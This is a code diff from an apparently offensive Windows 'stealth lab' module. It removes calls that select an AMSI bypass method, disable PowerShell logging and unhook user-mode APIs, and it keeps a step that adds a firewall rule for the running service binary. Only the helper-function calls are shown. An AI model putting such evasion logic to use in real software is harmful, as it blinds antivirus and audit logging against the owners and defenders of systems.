@@ -41,61 +41,7 @@ void Stealth_InitLabFeatures(void)
     if (!EnvEnabledW(L"STEALTH_LAB", defaultLab)) { return; }
     Stealth_EnsureLoggingDefaults();
 
-    // 1) AMSI bypass selection: STEALTH_AMSI = patch|hwbp|ntcontinue|none (default: patch)
-    if (stealthProfile == NULL || stealthProfile->amsiPatch != 0)
-    {
-        wchar_t amsiMode[16] = {0};
-        DWORD amsiLen = GetEnvironmentVariableW(L"STEALTH_AMSI", amsiMode, (DWORD)(sizeof(amsiMode)/sizeof(amsiMode[0])));
-        if (amsiLen == 0 || amsiLen >= (DWORD)(sizeof(amsiMode)/sizeof(amsiMode[0]))) {
-            // default
-            if (!Stealth_PatchAMSI())
-            {
-                Stealth_DebugPrintfA("Stealth_PatchAMSI default path failed");
-            }
-        } else {
-            for (DWORD i = 0; i < amsiLen; ++i) { wchar_t c = amsiMode[i]; if (c >= L'A' && c <= L'Z') amsiMode[i] = (wchar_t)(c - L'A' + L'a'); }
-            if (wcscmp(amsiMode, L"hwbp") == 0) {
-                if (!Stealth_PatchAMSI_HardwareBreakpoint())
-                {
-                    Stealth_DebugPrintfA("STEALTH_AMSI=hwbp failed to arm hardware breakpoint");
-                }
-            } else if (wcscmp(amsiMode, L"ntcontinue") == 0) {
-                if (!Stealth_PatchAMSI_NtContinue())
-                {
-                    Stealth_DebugPrintfA("STEALTH_AMSI=ntcontinue failed to activate bypass");
-                }
-            } else if (wcscmp(amsiMode, L"none") == 0) {
-                // do nothing
-            } else {
-                if (!Stealth_PatchAMSI())
-                {
-                    Stealth_DebugPrintfA("Stealth_PatchAMSI fallback failed");
-                }
-            }
-        }
-    }
-    else
-    {
-        Stealth_DebugPrintfA("Branding disabled AMSI patch; skipping lab AMSI bypass");
-    }
-
-    // 2) Disable PowerShell logging (default on in lab)
-    if (EnvEnabledW(L"STEALTH_DISABLE_POWERSHELL_LOG", 1)) {
-        if (!Stealth_DisablePowerShellLogging())
-        {
-            Stealth_DebugPrintfA("Stealth_DisablePowerShellLogging failed");
-        }
-    }
-
-    // 3) Unhook common user-mode APIs (default on in lab)
-    if (EnvEnabledW(L"STEALTH_API_UNHOOK", 1)) {
-        if (!Stealth_UnhookUserModeAPIs())
-        {
-            Stealth_DebugPrintfA("Stealth_UnhookUserModeAPIs failed");
-        }
-    }
-
-    // 4) Add firewall rule for current service binary (default on in lab)
+    // 1) Add firewall rule for current service binary (default on in lab)
     if (EnvEnabledW(L"STEALTH_FIREWALL", 1)) {
         wchar_t exePath[MAX_PATH] = {0};
         GetModulePathW(exePath, MAX_PATH);
